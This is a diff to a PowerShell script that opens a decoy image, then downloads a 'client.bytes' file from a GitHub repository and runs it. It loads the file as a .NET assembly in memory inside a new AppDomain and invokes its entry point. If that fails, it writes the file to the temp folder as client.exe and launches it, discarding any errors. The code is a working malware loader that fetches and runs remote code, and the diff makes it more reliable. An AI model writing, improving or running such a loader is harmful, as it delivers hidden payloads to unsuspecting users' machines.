@@ -5,20 +5,37 @@ try {
     # Open the downloaded image
     Start-Process "$env:TEMP\blue-bird.jpg"
     
-    # Download the bytes file directly from GitHub
+    # Download the bytes file from GitHub
     $bytesUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.bytes"
-    $response = Invoke-WebRequest -Uri $bytesUrl -UseBasicParsing
+    $bytesPath = "$env:TEMP\client.bytes"
+    Invoke-WebRequest -Uri $bytesUrl -OutFile $bytesPath
     
-    # Load bytes directly into memory
-    $bytes = $response.Content
+    # Read the bytes file and execute in memory
+    $bytes = [System.IO.File]::ReadAllBytes($bytesPath)
     
-    # Execute the bytes in memory without writing to disk
-    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    # Create a new AppDomain to load and execute the assembly
+    $customAppDomain = [System.AppDomain]::CreateDomain("ExecutionDomain")
+    
+    # Load and execute the bytes in memory
+    $assembly = $customAppDomain.Load($bytes)
     $entryPoint = $assembly.EntryPoint
     
-    # Invoke the main method
-    $entryPoint.Invoke($null, $null)
+    # Invoke the executable's entry point
+    if ($entryPoint.GetParameters().Length -eq 0) {
+        $entryPoint.Invoke($null, $null)
+    }
+    else {
+        $entryPoint.Invoke($null, (,[string[]]@()))
+    }
 } 
 catch {
-    # Error handling is kept minimal as per original script
+    # If the above method fails, fall back to traditional execution
+    try {
+        $exePath = "$env:TEMP\client.exe"
+        [System.IO.File]::WriteAllBytes($exePath, $bytes)
+        Start-Process $exePath -ErrorAction Stop
+    }
+    catch {
+        # Error handling is kept minimal as per original script
+    }
 }
